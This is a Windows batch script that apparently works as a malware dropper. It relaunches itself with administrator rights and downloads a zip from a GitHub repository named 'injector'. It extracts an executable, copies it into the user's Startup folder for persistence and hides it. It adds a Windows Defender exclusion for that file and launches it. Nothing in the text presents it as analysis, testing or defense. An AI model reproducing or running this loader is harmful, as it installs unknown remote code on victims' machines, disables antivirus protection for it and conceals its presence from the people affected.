@echo off
net session >nul 2>&1
if %errorlevel% neq 0 powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b
cd /d "%~dp0"
set "URL=https://github.com/dexovision/injector/raw/main/inh.zip"
set "ZIPFILE=inh.zip"
set "DESTDIR=repo"

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIPFILE%'"
mkdir "%DESTDIR%" 2>nul
tar -xf "%ZIPFILE%" -C "%DESTDIR%"

set "EXE_NAME=inh.exe"
set "SOURCE_PATH=%~dp0repo\inh.exe"
set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%EXE_NAME%"

copy "%SOURCE_PATH%" "%STARTUP_PATH%" /Y >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    if exist "%SOURCE_PATH%" del "%SOURCE_PATH%" /F /Q
)
rmdir /s /q "%DESTDIR%"
attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\inh.exe"
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\inh.exe'"
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\inh.exe"
pause